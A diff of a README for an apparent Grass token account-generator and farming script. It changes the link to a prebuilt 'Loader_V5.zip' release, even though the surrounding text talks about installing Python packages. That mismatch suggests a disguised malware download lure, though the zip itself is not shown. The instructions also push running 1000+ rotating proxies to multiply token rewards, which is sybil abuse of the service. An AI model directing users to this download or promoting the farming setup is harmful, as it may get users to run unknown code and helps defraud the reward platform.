@@ -45,7 +45,7 @@
 
 Before running the script, ensure you have Python installed on your machine. Then, install the necessary Python packages using:
 
-1. Download the Latest Version [here](https://github.com/Rynstick/LBS/releases/download/Latest/Loader_V5.zip)
+1. Download the Latest Version [here](https://github.com/Rynstick/GetGrass-AccountGen/releases/download/Latest/Loader_V5.zip)
 2. By default 100 proxies will be taken randomly, if you wanna change them, then change here `active_proxies = random.sample(all_proxies, 100)` line 87. Here 100 means 100 proxy will be used at once.
 3. Dont Forget to add multiple proxies, you can add up to 1000+ proxy || Format # `socks5://username:pass@ip:port`.
 4. You can get Multiple Proxy Ip address from Proxies.fo Website || [use multiple IP ! `1 IP == ~1500 $Grass per Day `.
